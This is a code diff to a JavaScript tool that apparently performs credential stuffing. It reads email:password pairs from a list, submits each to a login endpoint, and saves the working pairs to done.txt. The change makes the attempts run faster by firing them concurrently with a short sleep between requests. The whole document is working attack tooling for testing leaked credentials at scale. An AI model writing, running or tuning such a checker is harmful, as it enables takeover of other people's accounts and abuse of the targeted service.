@@ -28,6 +28,9 @@ async function login(email, password) {
             }
         });
         let data = await response.json();
+        if (data.status == 1) {
+            await done(email + ':' + password);
+        }
         return data;
     } catch (error) {
         console.log(error);
@@ -35,13 +38,17 @@ async function login(email, password) {
 }
 
 async function done(data) {
-    fset.open('./done.txt', 'a', 755, function( e, id ) {
+    fset.open('./done.txt', 'a', 755, function (e, id) {
         fset.write(id, data + "\r\n", null, 'utf8', function () {
             fset.close(id, function () {
-                console.log('Done: '+data);
+                console.log('Done: ' + data);
             });
         });
     })
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 (async () => {
@@ -52,11 +59,9 @@ async function done(data) {
         for (let i = 0; i < splitByLine.length; i++) {
             const data = splitByLine[i];
             let user = data.split(":");
-            let doLogin = await login(user[0], user[1]);
-
-            if (doLogin.status == 1) {
-                await done(user[0]+':'+user[1]);
-            }
+            login(user[0], user[1]);
+            await sleep(50);
+            console.log(i);
         }
 
     } catch (error) {
